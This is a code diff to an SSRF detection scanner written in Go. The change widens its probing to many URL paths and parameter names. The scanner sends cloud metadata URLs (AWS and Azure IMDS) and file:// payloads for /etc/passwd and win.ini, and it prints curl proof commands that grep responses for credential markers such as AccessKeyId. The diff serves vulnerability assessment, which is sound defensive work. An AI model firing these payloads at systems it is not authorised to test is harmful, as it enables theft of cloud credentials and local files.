@@ -42,6 +42,29 @@ var probeParams = []string{
 	"url", "redirect", "webhook", "image", "fetch",
 	"endpoint", "uri", "path", "proxy", "target",
 	"link", "src", "href", "goto",
+	"dest", "callback", "next", "return", "file", "page",
+}
+
+// probePaths are URL paths commonly associated with SSRF-vulnerable functionality.
+var probePaths = []string{
+	"/",
+	"/fetch",
+	"/proxy",
+	"/load",
+	"/url",
+	"/redirect",
+	"/callback",
+	"/webhook",
+	"/import",
+	"/upload",
+	"/download",
+	"/preview",
+	"/render",
+	"/api/fetch",
+	"/api/proxy",
+	"/api",
+	"/api/v1",
+	"/api/v2",
 }
 
 // metadataPayloads are cloud instance metadata endpoints. A successful SSRF
@@ -126,14 +149,152 @@ func (s *Scanner) Run(ctx context.Context, asset string, scanType module.ScanTyp
 
 	var findings []finding.Finding
 
-	for _, param := range probeParams {
-		for _, payload := range allMetadataPayloads {
-			u := base + "/?" + param + "=" + url.QueryEscape(payload)
+	for _, probePath := range probePaths {
+		for _, param := range probeParams {
+			for _, payload := range allMetadataPayloads {
+				u := base + probePath + "?" + param + "=" + url.QueryEscape(payload)
+				req, err := http.NewRequestWithContext(ctx, http.MethodGet, u, nil)
+				if err != nil {
+					continue
+				}
+				req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; BeaconScanner/1.0)")
+
+				resp, err := client.Do(req)
+				if err != nil {
+					continue
+				}
+
+				body, _ := io.ReadAll(io.LimitReader(resp.Body, maxBodySize))
+				_ = resp.Body.Close()
+
+				// A redirect is NOT SSRF — it's an open redirect at best. SSRF requires
+				// the server to fetch the URL itself and return the fetched content.
+				if resp.StatusCode >= 300 && resp.StatusCode < 400 {
+					continue
+				}
+
+				bodyStr := string(body)
+				signal := metadataSignalFound(bodyStr)
+				if signal == "" {
+					continue
+				}
+
+				findings = append(findings, finding.Finding{
+					CheckID:  finding.CheckWebSSRF,
+					Module:   "deep",
+					Scanner:  scannerName,
+					Severity: finding.SeverityCritical,
+					Title:    fmt.Sprintf("SSRF via parameter %q reflects cloud metadata on %s%s", param, asset, probePath),
+					Description: fmt.Sprintf(
+						"The parameter %q on %s%s accepted a cloud metadata URL (%s) and the "+
+							"response body contained %q, indicating the server fetched the "+
+							"metadata endpoint and returned its content. An attacker can use "+
+							"this to read IAM credentials and instance metadata from the cloud provider.",
+						param, asset, probePath, payload, signal),
+					Asset:    asset,
+					DeepOnly: true,
+					ProofCommand: fmt.Sprintf(
+						// --max-redirs 0 mirrors the scanner: we want the direct response,
+						// not a redirect chain. A 3xx is open redirect, not SSRF.
+						`curl -s --max-redirs 0 "%s%s?%s=%s" | grep -E "ami-id|AccessKeyId|instance-id|local-hostname|security-groups|serviceAccounts|project-id"`,
+						base, probePath, param, url.QueryEscape(payload)),
+					Evidence: map[string]any{
+						"url":     u,
+						"param":   param,
+						"path":    probePath,
+						"payload": payload,
+						"signal":  signal,
+					},
+					DiscoveredAt: time.Now(),
+				})
+
+				// One finding per param+path is sufficient; move to the next param.
+				break
+			}
+		}
+	}
+
+	// ── OOB redirect-to-metadata detection ─────────────────────────────────
+	// When a server redirects to the user-supplied URL instead of fetching it
+	// server-side, the Location header will contain a metadata IP. While this
+	// is technically an open redirect, redirecting to cloud metadata IPs is a
+	// well-known SSRF escalation pattern (e.g. IMDS via 302 redirect on ELB).
+	for _, probePath := range probePaths {
+		for _, param := range probeParams {
+			for _, payload := range allMetadataPayloads {
+				u := base + probePath + "?" + param + "=" + url.QueryEscape(payload)
+				req, err := http.NewRequestWithContext(ctx, http.MethodGet, u, nil)
+				if err != nil {
+					continue
+				}
+				req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; BeaconScanner/1.0)")
+
+				resp, err := client.Do(req)
+				if err != nil {
+					continue
+				}
+				_, _ = io.Copy(io.Discard, io.LimitReader(resp.Body, 1024)) //nolint:errcheck
+				_ = resp.Body.Close()
+
+				if resp.StatusCode < 300 || resp.StatusCode >= 400 {
+					continue
+				}
+
+				location := resp.Header.Get("Location")
+				if location == "" {
+					continue
+				}
+
+				if !isMetadataRedirect(location) {
+					continue
+				}
+
+				findings = append(findings, finding.Finding{
+					CheckID:  finding.CheckWebSSRFRedirectMetadata,
+					Module:   "deep",
+					Scanner:  scannerName,
+					Severity: finding.SeverityCritical,
+					Title:    fmt.Sprintf("SSRF via redirect: parameter %q redirects to cloud metadata on %s%s", param, asset, probePath),
+					Description: fmt.Sprintf(
+						"The parameter %q on %s%s caused a redirect (HTTP %d) to a cloud metadata "+
+							"endpoint (%s). When this application runs behind a load balancer or reverse proxy "+
+							"that follows redirects, the metadata service is reachable. An attacker can use "+
+							"this to steal IAM credentials and instance metadata.",
+						param, asset, probePath, resp.StatusCode, location),
+					Asset:    asset,
+					DeepOnly: true,
+					ProofCommand: fmt.Sprintf(
+						`curl -si "%s%s?%s=%s" | grep -i Location`,
+						base, probePath, param, url.QueryEscape(payload)),
+					Evidence: map[string]any{
+						"url":              u,
+						"param":            param,
+						"path":             probePath,
+						"payload":          payload,
+						"redirect_location": location,
+						"status_code":      resp.StatusCode,
+					},
+					DiscoveredAt: time.Now(),
+				})
+				// One finding per param+path is sufficient.
+				break
+			}
+		}
+	}
+
+	// Azure IMDS requires a Metadata: true header. Proxying servers may strip
+	// non-standard headers, so the main loop above tests without it. Here we
+	// probe explicitly with the header to catch servers that do forward it.
+	azurePayload := "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+	for _, probePath := range probePaths {
+		for _, param := range probeParams {
+			u := base + probePath + "?" + param + "=" + url.QueryEscape(azurePayload)
 			req, err := http.NewRequestWithContext(ctx, http.MethodGet, u, nil)
 			if err != nil {
 				continue
 			}
 			req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; BeaconScanner/1.0)")
+			req.Header.Set("Metadata", "true")
 
 			resp, err := client.Do(req)
 			if err != nil {
@@ -143,8 +304,6 @@ func (s *Scanner) Run(ctx context.Context, asset string, scanType module.ScanTyp
 			body, _ := io.ReadAll(io.LimitReader(resp.Body, maxBodySize))
 			_ = resp.Body.Close()
 
-			// A redirect is NOT SSRF — it's an open redirect at best. SSRF requires
-			// the server to fetch the URL itself and return the fetched content.
 			if resp.StatusCode >= 300 && resp.StatusCode < 400 {
 				continue
 			}
@@ -160,155 +319,28 @@ func (s *Scanner) Run(ctx context.Context, asset string, scanType module.ScanTyp
 				Module:   "deep",
 				Scanner:  scannerName,
 				Severity: finding.SeverityCritical,
-				Title:    fmt.Sprintf("SSRF via parameter %q reflects cloud metadata on %s", param, asset),
+				Title:    fmt.Sprintf("SSRF via parameter %q reflects Azure metadata on %s%s", param, asset, probePath),
 				Description: fmt.Sprintf(
-					"The parameter %q on %s accepted a cloud metadata URL (%s) and the "+
-						"response body contained %q, indicating the server fetched the "+
-						"metadata endpoint and returned its content. An attacker can use "+
-						"this to read IAM credentials and instance metadata from the cloud provider.",
-					param, asset, payload, signal),
+					"The parameter %q on %s%s accepted an Azure IMDS URL (%s) with the required "+
+						"Metadata: true header, and the response body contained %q. An attacker can use "+
+						"this to read Azure subscription details, VM identity, and managed identity credentials.",
+					param, asset, probePath, azurePayload, signal),
 				Asset:    asset,
 				DeepOnly: true,
 				ProofCommand: fmt.Sprintf(
-					// --max-redirs 0 mirrors the scanner: we want the direct response,
-					// not a redirect chain. A 3xx is open redirect, not SSRF.
-					`curl -s --max-redirs 0 "%s/?%s=%s" | grep -E "ami-id|AccessKeyId|instance-id|local-hostname|security-groups|serviceAccounts|project-id"`,
-					base, param, url.QueryEscape(payload)),
+					`curl -s --max-redirs 0 -H 'Metadata: true' "%s%s?%s=%s" | grep -E "subscriptionId|vmId|instance-id"`,
+					base, probePath, param, url.QueryEscape(azurePayload)),
 				Evidence: map[string]any{
 					"url":     u,
 					"param":   param,
-					"payload": payload,
+					"path":    probePath,
+					"payload": azurePayload,
 					"signal":  signal,
 				},
 				DiscoveredAt: time.Now(),
 			})
-
-			// One finding per param is sufficient; move to the next param.
 			break
 		}
-	}
-
-	// ── OOB redirect-to-metadata detection ─────────────────────────────────
-	// When a server redirects to the user-supplied URL instead of fetching it
-	// server-side, the Location header will contain a metadata IP. While this
-	// is technically an open redirect, redirecting to cloud metadata IPs is a
-	// well-known SSRF escalation pattern (e.g. IMDS via 302 redirect on ELB).
-	for _, param := range probeParams {
-		for _, payload := range allMetadataPayloads {
-			u := base + "/?" + param + "=" + url.QueryEscape(payload)
-			req, err := http.NewRequestWithContext(ctx, http.MethodGet, u, nil)
-			if err != nil {
-				continue
-			}
-			req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; BeaconScanner/1.0)")
-
-			resp, err := client.Do(req)
-			if err != nil {
-				continue
-			}
-			_, _ = io.Copy(io.Discard, io.LimitReader(resp.Body, 1024)) //nolint:errcheck
-			_ = resp.Body.Close()
-
-			if resp.StatusCode < 300 || resp.StatusCode >= 400 {
-				continue
-			}
-
-			location := resp.Header.Get("Location")
-			if location == "" {
-				continue
-			}
-
-			if !isMetadataRedirect(location) {
-				continue
-			}
-
-			findings = append(findings, finding.Finding{
-				CheckID:  finding.CheckWebSSRFRedirectMetadata,
-				Module:   "deep",
-				Scanner:  scannerName,
-				Severity: finding.SeverityCritical,
-				Title:    fmt.Sprintf("SSRF via redirect: parameter %q redirects to cloud metadata on %s", param, asset),
-				Description: fmt.Sprintf(
-					"The parameter %q on %s caused a redirect (HTTP %d) to a cloud metadata "+
-						"endpoint (%s). When this application runs behind a load balancer or reverse proxy "+
-						"that follows redirects, the metadata service is reachable. An attacker can use "+
-						"this to steal IAM credentials and instance metadata.",
-					param, asset, resp.StatusCode, location),
-				Asset:    asset,
-				DeepOnly: true,
-				ProofCommand: fmt.Sprintf(
-					`curl -si "%s/?%s=%s" | grep -i Location`,
-					base, param, url.QueryEscape(payload)),
-				Evidence: map[string]any{
-					"url":              u,
-					"param":            param,
-					"payload":          payload,
-					"redirect_location": location,
-					"status_code":      resp.StatusCode,
-				},
-				DiscoveredAt: time.Now(),
-			})
-			// One finding per param is sufficient.
-			break
-		}
-	}
-
-	// Azure IMDS requires a Metadata: true header. Proxying servers may strip
-	// non-standard headers, so the main loop above tests without it. Here we
-	// probe explicitly with the header to catch servers that do forward it.
-	azurePayload := "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
-	for _, param := range probeParams {
-		u := base + "/?" + param + "=" + url.QueryEscape(azurePayload)
-		req, err := http.NewRequestWithContext(ctx, http.MethodGet, u, nil)
-		if err != nil {
-			continue
-		}
-		req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; BeaconScanner/1.0)")
-		req.Header.Set("Metadata", "true")
-
-		resp, err := client.Do(req)
-		if err != nil {
-			continue
-		}
-
-		body, _ := io.ReadAll(io.LimitReader(resp.Body, maxBodySize))
-		_ = resp.Body.Close()
-
-		if resp.StatusCode >= 300 && resp.StatusCode < 400 {
-			continue
-		}
-
-		bodyStr := string(body)
-		signal := metadataSignalFound(bodyStr)
-		if signal == "" {
-			continue
-		}
-
-		findings = append(findings, finding.Finding{
-			CheckID:  finding.CheckWebSSRF,
-			Module:   "deep",
-			Scanner:  scannerName,
-			Severity: finding.SeverityCritical,
-			Title:    fmt.Sprintf("SSRF via parameter %q reflects Azure metadata on %s", param, asset),
-			Description: fmt.Sprintf(
-				"The parameter %q on %s accepted an Azure IMDS URL (%s) with the required "+
-					"Metadata: true header, and the response body contained %q. An attacker can use "+
-					"this to read Azure subscription details, VM identity, and managed identity credentials.",
-				param, asset, azurePayload, signal),
-			Asset:    asset,
-			DeepOnly: true,
-			ProofCommand: fmt.Sprintf(
-				`curl -s --max-redirs 0 -H 'Metadata: true' "%s/?%s=%s" | grep -E "subscriptionId|vmId|instance-id"`,
-				base, param, url.QueryEscape(azurePayload)),
-			Evidence: map[string]any{
-				"url":     u,
-				"param":   param,
-				"payload": azurePayload,
-				"signal":  signal,
-			},
-			DiscoveredAt: time.Now(),
-		})
-		break
 	}
 
 	// ── Protocol scheme bypass probes ────────────────────────────────────
@@ -322,56 +354,59 @@ func (s *Scanner) Run(ctx context.Context, asset string, scanType module.ScanTyp
 		{"file:///etc/passwd", "root:", "local file read via file:// protocol"},
 		{"file:///c:/windows/win.ini", "[fonts]", "local file read via file:// protocol (Windows)"},
 	}
-	for _, param := range probeParams {
-		for _, pp := range protocolPayloads {
-			u := base + "/?" + param + "=" + url.QueryEscape(pp.url)
-			req, err := http.NewRequestWithContext(ctx, http.MethodGet, u, nil)
-			if err != nil {
-				continue
-			}
-			req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; BeaconScanner/1.0)")
+	for _, probePath := range probePaths {
+		for _, param := range probeParams {
+			for _, pp := range protocolPayloads {
+				u := base + probePath + "?" + param + "=" + url.QueryEscape(pp.url)
+				req, err := http.NewRequestWithContext(ctx, http.MethodGet, u, nil)
+				if err != nil {
+					continue
+				}
+				req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; BeaconScanner/1.0)")
 
-			resp, err := client.Do(req)
-			if err != nil {
-				continue
-			}
-			body, _ := io.ReadAll(io.LimitReader(resp.Body, maxBodySize))
-			_ = resp.Body.Close()
+				resp, err := client.Do(req)
+				if err != nil {
+					continue
+				}
+				body, _ := io.ReadAll(io.LimitReader(resp.Body, maxBodySize))
+				_ = resp.Body.Close()
 
-			if resp.StatusCode >= 300 && resp.StatusCode < 400 {
-				continue
-			}
+				if resp.StatusCode >= 300 && resp.StatusCode < 400 {
+					continue
+				}
 
-			bodyStr := string(body)
-			if !strings.Contains(bodyStr, pp.signal) {
-				continue
-			}
+				bodyStr := string(body)
+				if !strings.Contains(bodyStr, pp.signal) {
+					continue
+				}
 
-			findings = append(findings, finding.Finding{
-				CheckID:  finding.CheckWebSSRF,
-				Module:   "deep",
-				Scanner:  scannerName,
-				Severity: finding.SeverityCritical,
-				Title:    fmt.Sprintf("SSRF via %s protocol: parameter %q on %s", strings.SplitN(pp.url, ":", 2)[0], param, asset),
-				Description: fmt.Sprintf(
-					"The parameter %q on %s accepted a %s URL (%s) and returned content "+
-						"indicating %s. The SSRF filter does not block non-HTTP protocol schemes, "+
-						"allowing an attacker to read local files or interact with internal services.",
-					param, asset, strings.SplitN(pp.url, ":", 2)[0], pp.url, pp.desc),
-				Asset:    asset,
-				DeepOnly: true,
-				ProofCommand: fmt.Sprintf(
-					`curl -s --max-redirs 0 "%s/?%s=%s"`,
-					base, param, url.QueryEscape(pp.url)),
-				Evidence: map[string]any{
-					"url":      u,
-					"param":    param,
-					"payload":  pp.url,
-					"protocol": strings.SplitN(pp.url, ":", 2)[0],
-				},
-				DiscoveredAt: time.Now(),
-			})
-			break
+				findings = append(findings, finding.Finding{
+					CheckID:  finding.CheckWebSSRF,
+					Module:   "deep",
+					Scanner:  scannerName,
+					Severity: finding.SeverityCritical,
+					Title:    fmt.Sprintf("SSRF via %s protocol: parameter %q on %s%s", strings.SplitN(pp.url, ":", 2)[0], param, asset, probePath),
+					Description: fmt.Sprintf(
+						"The parameter %q on %s%s accepted a %s URL (%s) and returned content "+
+							"indicating %s. The SSRF filter does not block non-HTTP protocol schemes, "+
+							"allowing an attacker to read local files or interact with internal services.",
+						param, asset, probePath, strings.SplitN(pp.url, ":", 2)[0], pp.url, pp.desc),
+					Asset:    asset,
+					DeepOnly: true,
+					ProofCommand: fmt.Sprintf(
+						`curl -s --max-redirs 0 "%s%s?%s=%s"`,
+						base, probePath, param, url.QueryEscape(pp.url)),
+					Evidence: map[string]any{
+						"url":      u,
+						"param":    param,
+						"path":     probePath,
+						"payload":  pp.url,
+						"protocol": strings.SplitN(pp.url, ":", 2)[0],
+					},
+					DiscoveredAt: time.Now(),
+				})
+				break
+			}
 		}
 	}
 
